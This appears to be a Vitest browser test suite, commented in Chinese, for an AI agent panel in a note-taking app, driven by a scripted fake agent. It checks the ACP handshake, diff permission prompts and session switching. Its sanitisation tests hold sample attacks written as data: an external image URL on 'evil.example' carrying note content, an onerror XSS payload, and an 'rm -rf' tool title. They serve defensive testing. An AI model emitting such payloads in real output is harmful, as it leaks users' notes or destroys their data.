/**
 * AI 会话面板（§7.8）。对面是一个照着剧本说话的假 agent。
 *
 * 剧本照抄真机（Claude 的 ACP 适配器）：先流式回一段话，再为改文件来要
 * 许可 —— 许可请求的 id 是 0，带着 diff；拿到「允许」之后把工具调用标成
 * 完成，最后才回 `session/prompt`。
 *
 * 要在真浏览器里跑：回答是 `dangerouslySetInnerHTML` 进去的，链接点下去
 * 会不会把整个 webview 带走、外链图片会不会被加载，happy-dom 答不了。
 */
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import "../../../src/ui/styles.css";

type Listener = (e: { id: string; line?: string; code?: number | null }) => void;

const h = vi.hoisted(() => {
  const state = {
    lines: [] as Listener[],
    errs: [] as Listener[],
    exits: [] as Listener[],
    /** 面板发给 agent 的每一条，已解析 */
    sent: [] as Record<string, unknown>[],
    /** 收到某个方法时怎么办 */
    script: {} as Record<string, (msg: Record<string, unknown>) => void>,
    /** `agentStart` 之前抢先发生的事（命令打错时进程几乎是立刻退出） */
    beforeStart: null as null | (() => void),
  };
  return { state };
});
const { state } = h;

const emit = (line: object) => state.lines.forEach((f) => f({ id: "agent-1", line: JSON.stringify(line) }));
const reply = (id: unknown, result: unknown) => emit({ jsonrpc: "2.0", id, result });
const update = (u: object) => emit({ jsonrpc: "2.0", method: "session/update", params: { sessionId: "s1", update: u } });

vi.mock("../../../src/host/api", () => ({
  api: {
    agentStart: vi.fn(async () => {
      h.state.beforeStart?.();
      return ["agent-1", "D:\\Notes\\vault"];
    }),
    agentSend: vi.fn(async (_id: string, line: string) => {
      const msg = JSON.parse(line);
      h.state.sent.push(msg);
      const run = h.state.script[msg.method as string];
      if (run) setTimeout(() => run(msg), 0);
    }),
    agentStop: vi.fn(async () => {}),
    textDiff: vi.fn(async (path: string, _old: string, next: string) => ({
      path,
      kind: "added",
      additions: 1,
      deletions: 0,
      binary: false,
      hunks: [
        {
          oldStart: 0,
          oldLines: 0,
          newStart: 1,
          newLines: 1,
          lines: [{ kind: "added", oldLine: null, newLine: 1, text: next.trim() }],
        },
      ],
    })),
  },
  onAgentLine: async (f: Listener) => {
    h.state.lines.push(f);
    return () => {};
  },
  onAgentStderr: async (f: Listener) => {
    h.state.errs.push(f);
    return () => {};
  },
  onAgentExit: async (f: Listener) => {
    h.state.exits.push(f);
    return () => {};
  },
}));

const openExternalPage = vi.fn();
vi.mock("../../../src/host/external", () => ({ openExternalPage: (u: string) => openExternalPage(u) }));

const { AgentPanel } = await import("../../../src/ui/AgentPanel");

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const settle = (ms = 60) => new Promise((r) => setTimeout(r, ms));

/** 等到条件成立。握手是好几轮异步来回，固定睡多久都可能不够 */
async function until(cond: () => boolean, what: string) {
  for (let i = 0; i < 60 && !cond(); i++) {
    await act(async () => {
      await settle(25);
    });
  }
  expect(cond(), what).toBe(true);
}

const handshake = () => {
  state.script.initialize = (m) => reply(m.id, { protocolVersion: 1, agentInfo: { name: "fake", title: "Fake Agent" } });
  state.script["session/new"] = (m) =>
    reply(m.id, {
      sessionId: "s1",
      modes: {
        currentModeId: "default",
        availableModes: [
          { id: "default", name: "Default" },
          { id: "acceptEdits", name: "Accept Edits" },
        ],
      },
    });
};

let root: Root | null = null;
let host: HTMLElement;
const onOpenPath = vi.fn();
const beforePrompt = vi.fn(async () => {});

const onPickCommand = vi.fn();

async function mount(
  ctx = { path: "项目/甲.md" as string | null, selection: "" },
  command = "fake-agent",
) {
  host = document.createElement("div");
  host.style.cssText = "position:fixed;inset:0;display:grid;grid-template-areas:'agent'";
  document.body.appendChild(host);
  root = createRoot(host);
  await act(async () => {
    root!.render(
      <AgentPanel
        command={command}
        onPickCommand={onPickCommand}
        width={420}
        onWidthChange={() => {}}
        cover={false}
        onClose={() => {}}
        getContext={() => ctx}
        beforePrompt={beforePrompt}
        onOpenPath={onOpenPath}
        onOpenSettings={() => {}}
      />,
    );
    await settle(50);
  });
  // 停在「能用」或者「已经退出」之一，才算起完了
  await until(
    () =>
      !!host.querySelector(".agent-dead") ||
      !!host.querySelector(".agent-choose") ||
      (state.sent.some((m) => m.method === "session/new") &&
        !host.querySelector(".agent-status") &&
        !!host.querySelector(".agent-empty")),
    "面板该停在「能用」或「已经退出」",
  );
}

async function type(text: string) {
  const ta = host.querySelector("textarea")!;
  await act(async () => {
    const set = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!;
    set.call(ta, text);
    ta.dispatchEvent(new Event("input", { bubbles: true }));
    await settle(10);
  });
  await act(async () => {
    ta.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
    await settle(150);
  });
}

const button = (label: string) =>
  [...host.querySelectorAll<HTMLButtonElement>("button")].find((b) => b.textContent?.trim() === label);

beforeEach(() => {
  state.lines = [];
  state.errs = [];
  state.exits = [];
  state.sent = [];
  state.script = {};
  state.beforeStart = null;
  openExternalPage.mockClear();
  onOpenPath.mockClear();
  beforePrompt.mockClear();
  handshake();
});

afterEach(() => {
  act(() => root?.unmount());
  root = null;
  document.body.innerHTML = "";
});

describe("起来", () => {
  it("还没选过跑哪个：什么都不起，请人挑一个", async () => {
    const { api } = await import("../../../src/host/api");
    (api.agentStart as ReturnType<typeof vi.fn>).mockClear();
    await mount(undefined, "");
    expect(api.agentStart, "不能替人跑一个他没选过的程序（§7.5）").not.toHaveBeenCalled();
    expect(host.querySelector<HTMLTextAreaElement>("textarea")!.disabled).toBe(true);
    await act(async () => {
      [...host.querySelectorAll<HTMLButtonElement>(".agent-choice")]
        .find((b) => b.textContent?.includes("Codex"))!
        .click();
      await settle(10);
    });
    expect(onPickCommand).toHaveBeenCalledWith("npx -y @zed-industries/codex-acp");
  });


  it("握手、开会话，标题是 agent 的名字，模式可选", async () => {
    await mount();
    expect(state.sent.map((m) => m.method)).toEqual(["initialize", "session/new"]);
    // 工作目录交给 agent 的是 vault 根
    expect(state.sent[1].params).toEqual({ cwd: "D:\\Notes\\vault", mcpServers: [] });
    // 左上角是当前对话的名字；agent 的名字在提示里
    expect(host.querySelector(".agent-title")?.textContent).toContain("新对话");
    expect(host.querySelector(".agent-title")?.getAttribute("title")).toContain("Fake Agent");
    const select = host.querySelector<HTMLSelectElement>(".agent-mode")!;
    expect([...select.options].map((o) => o.textContent)).toEqual(["Default", "Accept Edits"]);
    expect(host.querySelector<HTMLTextAreaElement>("textarea")!.disabled).toBe(false);
  });

  it("命令打错：进程在拿到 id 之前就退出了，也要停在「已经退出」并摆出原因", async () => {
    state.beforeStart = () => {
      state.errs.forEach((f) => f({ id: "agent-1", line: "'fake-agent' 不是内部或外部命令" }));
      state.exits.forEach((f) => f({ id: "agent-1", code: 1 }));
    };
    await mount();
    const dead = host.querySelector(".agent-dead");
    expect(dead, "不能一直停在「正在启动」").not.toBeNull();
    expect(dead!.textContent).toContain("退出码 1");
    expect(host.querySelector(".agent-stderr")?.textContent).toContain("不是内部或外部命令");
    expect(button("重新启动")).toBeTruthy();
  });

  it("需要登录：说清楚去哪儿登录，而不是只给一个错误码", async () => {
    state.script["session/new"] = (m) =>
      emit({ jsonrpc: "2.0", id: m.id, error: { code: -32000, message: "Authentication required" } });
    await mount();
    expect(host.querySelector(".agent-dead")?.textContent).toContain("需要先登录");
  });
});

describe("一轮对话", () => {
  it("带上当前笔记，回答按 Markdown 和公式排好版", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "**重点** 是 " } });
      update({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "$x^2$" } });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("总结一下");

    expect(beforePrompt, "发问之前先落盘：agent 读的是磁盘上的文件").toHaveBeenCalled();
    const prompt = state.sent.find((m) => m.method === "session/prompt")!.params as {
      prompt: { type: string; uri?: string; text?: string }[];
    };
    expect(prompt.prompt[0]).toEqual({ type: "text", text: "总结一下" });
    expect(prompt.prompt[1]).toMatchObject({
      type: "resource_link",
      uri: "file:///D:/Notes/vault/%E9%A1%B9%E7%9B%AE/%E7%94%B2.md",
    });

    expect(host.querySelector(".agent-msg.is-user")?.textContent).toContain("总结一下");
    const md = host.querySelector(".agent-md")!;
    expect(md.querySelector("strong")?.textContent).toBe("重点");
    expect(md.querySelector(".katex"), "公式要渲染出来").not.toBeNull();
  });

  it("点掉笔记那一枚，就不带它", async () => {
    state.script["session/prompt"] = (m) => reply(m.id, { stopReason: "end_turn" });
    await mount();
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-chip")!.click();
      await settle(10);
    });
    await type("随便聊聊");
    const prompt = state.sent.find((m) => m.method === "session/prompt")!.params as { prompt: unknown[] };
    expect(prompt.prompt).toHaveLength(1);
  });

  it("要改文件：先摆出 diff 等人点头，点「允许」才回给它", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "tool_call", toolCallId: "t1", title: "Write", kind: "edit", status: "pending" });
      emit({
        jsonrpc: "2.0",
        id: 0,
        method: "session/request_permission",
        params: {
          sessionId: "s1",
          toolCall: {
            toolCallId: "t1",
            title: "Write 项目/乙.md",
            kind: "edit",
            content: [{ type: "diff", path: "D:\\Notes\\vault\\项目\\乙.md", oldText: null, newText: "新的一篇\n" }],
          },
          options: [
            { kind: "allow_always", name: "Always Allow", optionId: "allow_always" },
            { kind: "allow_once", name: "Allow", optionId: "allow" },
            { kind: "reject_once", name: "Reject", optionId: "reject" },
          ],
        },
      });
      state.script.__afterPermission = () => {
        update({
          sessionUpdate: "tool_call_update",
          toolCallId: "t1",
          title: "Write 项目/乙.md",
          status: "completed",
          content: [{ type: "diff", path: "D:\\Notes\\vault\\项目\\乙.md", oldText: null, newText: "新的一篇\n" }],
        });
        reply(m.id, { stopReason: "end_turn" });
      };
    };
    await mount();
    await type("新建一篇乙");

    const card = host.querySelector(".agent-permission");
    expect(card, "许可请求要摆出来").not.toBeNull();
    expect(card!.textContent).toContain("Write 项目/乙.md");
    // 路径换成 vault 里的相对路径，diff 用版本历史那个视图画
    expect(card!.querySelector(".agent-diff-path")?.textContent).toContain("项目/乙.md");
    expect(card!.querySelector(".diff-unified")?.textContent).toContain("新的一篇");
    expect([...card!.querySelectorAll("button")].map((b) => b.textContent)).toEqual(["总是允许", "允许", "拒绝"]);
    expect(state.sent.some((m) => m.id === 0), "人还没点，不能替他回").toBe(false);

    await act(async () => {
      button("允许")!.click();
      await settle(30);
    });
    expect(state.sent.find((m) => m.id === 0)).toEqual({
      jsonrpc: "2.0",
      id: 0,
      result: { outcome: { outcome: "selected", optionId: "allow" } },
    });
    await act(async () => {
      // 许可的回答没有 method，剧本接不住它 —— 这里手动接着往下演
      state.script.__afterPermission?.({});
      await settle(60);
    });
    expect(host.querySelector(".agent-permission")).toBeNull();
    expect(host.querySelector(".agent-tool.is-completed")).not.toBeNull();

    // 改到的那篇可以直接点开
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-tool-files .agent-link")!.click();
      await settle(10);
    });
    expect(onOpenPath).toHaveBeenCalledWith("项目/乙.md");
  });

  it("停下：发 session/cancel，还没回的许可按「取消」回掉", async () => {
    state.script["session/prompt"] = () => {
      emit({
        jsonrpc: "2.0",
        id: 0,
        method: "session/request_permission",
        params: {
          sessionId: "s1",
          toolCall: { toolCallId: "t1", title: "rm -rf 笔记", kind: "execute" },
          options: [{ kind: "allow_once", name: "Allow", optionId: "allow" }],
        },
      });
    };
    await mount();
    await type("清理一下");
    expect(host.querySelector(".agent-permission")).not.toBeNull();
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-send.is-stop")!.click();
      await settle(30);
    });
    expect(state.sent.find((m) => m.id === 0)).toMatchObject({ result: { outcome: { outcome: "cancelled" } } });
    expect(state.sent.some((m) => m.method === "session/cancel")).toBe(true);
  });
});

describe("回答里的东西不能越界", () => {
  it("链接交给系统浏览器，webview 不原地跳走", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "见 [文档](https://example.com/doc)" } });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("给个链接");
    const a = host.querySelector<HTMLAnchorElement>(".agent-md a")!;
    const before = location.href;
    await act(async () => {
      a.click();
      await settle(10);
    });
    expect(location.href).toBe(before);
    expect(openExternalPage).toHaveBeenCalledWith("https://example.com/doc");
  });

  it("外链图片不加载 —— 那是把笔记内容送出去的一条路", async () => {
    state.script["session/prompt"] = (m) => {
      update({
        sessionUpdate: "agent_message_chunk",
        content: { type: "text", text: "![](https://evil.example/x.png?q=笔记内容)" },
      });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("画张图");
    expect(host.querySelector(".agent-md img")).toBeNull();
  });

  it("原样的 HTML 不执行", async () => {
    state.script["session/prompt"] = (m) => {
      update({
        sessionUpdate: "agent_message_chunk",
        content: { type: "text", text: '<img src=x onerror="window.__pwned=1">' },
      });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("x");
    await act(async () => {
      await settle(100);
    });
    expect((window as { __pwned?: number }).__pwned).toBeUndefined();
    expect(host.querySelector(".agent-md img")).toBeNull();
  });
});

describe("切换对话", () => {
  /** 每次 session/new 给一个新 id，回答里带上是哪个对话 */
  const twoSessions = () => {
    let n = 0;
    state.script["session/new"] = (m) => reply(m.id, { sessionId: `s${++n}` });
    state.script["session/prompt"] = (m) => {
      const sid = (m.params as { sessionId: string }).sessionId;
      emit({
        jsonrpc: "2.0",
        method: "session/update",
        params: { sessionId: sid, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: `这里是 ${sid}` } } },
      });
      reply(m.id, { stopReason: "end_turn" });
    };
  };

  const openMenu = async () => {
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-title")!.click();
      await settle(60);
    });
  };
  const menuItems = () => [...host.querySelectorAll<HTMLButtonElement>(".agent-menu-item:not(.is-new)")];

  it("开着的几个对话可以来回切，各说各的", async () => {
    twoSessions();
    await mount();
    await type("第一个问题");
    expect(host.querySelector(".agent-md")?.textContent).toBe("这里是 s1");

    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(60);
    });
    expect(host.querySelector(".agent-msg"), "新对话是空白的").toBeNull();
    await type("第二个问题");
    expect(host.querySelector(".agent-md")?.textContent).toBe("这里是 s2");
    expect(host.querySelector(".agent-title")?.textContent).toContain("第二个问题");

    await openMenu();
    expect(menuItems().map((b) => b.querySelector(".agent-menu-title")?.textContent)).toEqual([
      "第二个问题",
      "第一个问题",
    ]);
    await act(async () => {
      menuItems()[1].click();
      await settle(60);
    });
    expect(host.querySelector(".agent-msg.is-user")?.textContent).toContain("第一个问题");
    expect(host.querySelector(".agent-md")?.textContent).toBe("这里是 s1");
    expect(host.querySelector(".agent-menu"), "选完就收起").toBeNull();
  });

  it("空白的新对话不重复开：再点「新对话」不会多出一个", async () => {
    twoSessions();
    await mount();
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(60);
    });
    expect(state.sent.filter((m) => m.method === "session/new")).toHaveLength(1);
  });

  it("后台那个对话来要许可：列表里标出来，切过去才看得到那张卡", async () => {
    let n = 0;
    state.script["session/new"] = (m) => reply(m.id, { sessionId: `s${++n}` });
    state.script["session/prompt"] = (m) => {
      const sid = (m.params as { sessionId: string }).sessionId;
      if (sid === "s1") {
        // 第一个对话：过一会儿才来要许可，那时人已经切到第二个了
        setTimeout(
          () =>
            emit({
              jsonrpc: "2.0",
              id: 0,
              method: "session/request_permission",
              params: {
                sessionId: "s1",
                toolCall: { toolCallId: "t1", title: "Write 甲.md", kind: "edit" },
                options: [{ kind: "allow_once", name: "Allow", optionId: "allow" }],
              },
            }),
          120,
        );
      } else reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("改一下甲");
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(300);
    });
    expect(host.querySelector(".agent-permission"), "不是这个对话的许可，不能摆在这里").toBeNull();

    await openMenu();
    const first = menuItems().find((b) => b.textContent?.includes("改一下甲"))!;
    expect(first.querySelector(".agent-menu-meta")?.textContent).toBe("等你确认");
    await act(async () => {
      first.click();
      await settle(60);
    });
    expect(host.querySelector(".agent-permission")?.textContent).toContain("Write 甲.md");
  });

  it("以前的对话：agent 列得出来就能接着聊，历史由它重放过来", async () => {
    state.script.initialize = (m) =>
      reply(m.id, {
        protocolVersion: 1,
        agentInfo: { name: "fake" },
        agentCapabilities: { loadSession: true, sessionCapabilities: { list: {} } },
      });
    state.script["session/list"] = (m) =>
      reply(m.id, {
        sessions: [{ sessionId: "old1", cwd: String.raw`D:\Notes\vault`, title: "整理论文清单", updatedAt: "2026-10-01T08:00:00Z" }],
      });
    state.script["session/load"] = (m) => {
      const say = (update: object) =>
        emit({ jsonrpc: "2.0", method: "session/update", params: { sessionId: "old1", update } });
      say({ sessionUpdate: "user_message_chunk", content: { type: "text", text: "把清单整理一下" } });
      say({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "整理好了" } });
      reply(m.id, {});
    };
    await mount();
    await openMenu();
    expect(state.sent.find((m) => m.method === "session/list")?.params).toEqual({ cwd: String.raw`D:\Notes\vault` });
    const old = menuItems().find((b) => b.textContent?.includes("整理论文清单"));
    expect(old, "以前的对话要列出来").toBeTruthy();
    await act(async () => {
      old!.click();
      await settle(100);
    });
    expect(state.sent.find((m) => m.method === "session/load")?.params).toMatchObject({ sessionId: "old1" });
    expect(host.querySelector(".agent-msg.is-user")?.textContent).toContain("把清单整理一下");
    expect(host.querySelector(".agent-md")?.textContent).toBe("整理好了");
    expect(host.querySelector(".agent-title")?.textContent).toContain("整理论文清单");
  });

  it("agent 不提供以前的对话：只列这次的，并说一声", async () => {
    await mount();
    await openMenu();
    expect(state.sent.some((m) => m.method === "session/list")).toBe(false);
    expect(host.querySelector(".agent-menu-note")?.textContent).toContain("不提供以前的对话");
  });
});
